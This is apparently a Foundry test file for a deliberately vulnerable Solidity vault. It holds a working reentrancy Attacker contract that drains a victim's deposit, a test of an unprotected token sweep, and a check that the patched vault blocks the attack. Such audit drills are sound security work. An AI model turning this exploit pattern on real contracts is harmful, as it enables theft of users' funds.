// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VaultDrill} from "../src/VaultDrill.sol";
import {VaultDrillFixed} from "../src/VaultDrillFixed.sol";

/// Minimal interface shared by VaultDrill and VaultDrillFixed, so one
/// Attacker contract can target either vault.
interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

/// Minimal ERC20 used only to give the vault tokens for the sweep test.
contract MockERC20 {
    string public name = "Mock Token";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Attacker contract: deposits 1 ether, then reenters withdraw() from its
/// receive() while the vault still holds ether.
contract Attacker {
    IVault public vault;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack() external {
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

contract VaultDrillTest is Test {
    VaultDrill public vault;
    VaultDrillFixed public fixedVault;
    MockERC20 public token;

    address public victim = makeAddr("victim");
    address public stranger = makeAddr("stranger");
    Attacker public attacker;
    Attacker public fixedAttacker;

    function setUp() public {
        vault = new VaultDrill();
        fixedVault = new VaultDrillFixed();
        token = new MockERC20();
        attacker = new Attacker(address(vault));
        fixedAttacker = new Attacker(address(fixedVault));

        // This test contract funds the two attacker deposits (1 ether each).
        vm.deal(address(this), 2 ether);

        // Victim deposits 10 ether into EACH vault (20 ether total).
        vm.deal(victim, 20 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
        vm.prank(victim);
        fixedVault.deposit{value: 10 ether}();

        // Attacker deposits 1 ether into EACH vault.
        attacker.deposit{value: 1 ether}();
        fixedAttacker.deposit{value: 1 ether}();

        // Vault holds 1,000 mock tokens for the sweep test.
        token.mint(address(vault), 1_000 ether);
    }

    /// Bug #1 (Critical, reentrancy): the attacker reenters withdraw() and
    /// drains the whole vault, including the victim's 10 ether.
    function testReentrancyDrain() public {
        attacker.attack();

        assertEq(address(vault).balance, 0, "vault should be drained");
        assertEq(address(attacker).balance, 11 ether, "attacker holds victim funds too");
        assertEq(vault.balances(victim), 10 ether, "victim balance recorded but unbacked");
    }

    /// Bug #2 (Critical, missing access control): anyone — here a random
    /// stranger, not the owner — can call sweep() and take the vault's tokens.
    function testSweepAnyone() public {
        vm.prank(stranger);
        vault.sweep(address(token), 1_000 ether);

        assertEq(token.balanceOf(stranger), 1_000 ether, "stranger stole the tokens");
        assertEq(token.balanceOf(address(vault)), 0, "vault holds no tokens anymore");
    }

    /// Patch check: on the fixed vault (CEI + nonReentrant) the same
    /// reentrancy attempt reverts and the victim's funds stay untouched.
    function testPatchWithdraw() public {
        vm.expectRevert();
        fixedAttacker.attack();

        assertEq(address(fixedVault).balance, 11 ether, "fixed vault keeps all funds");
        assertEq(fixedVault.balances(victim), 10 ether, "victim balance intact");
        assertEq(fixedVault.balances(address(fixedAttacker)), 1 ether, "attacker balance intact");
        assertEq(address(fixedAttacker).balance, 0, "attacker got nothing");
    }
}
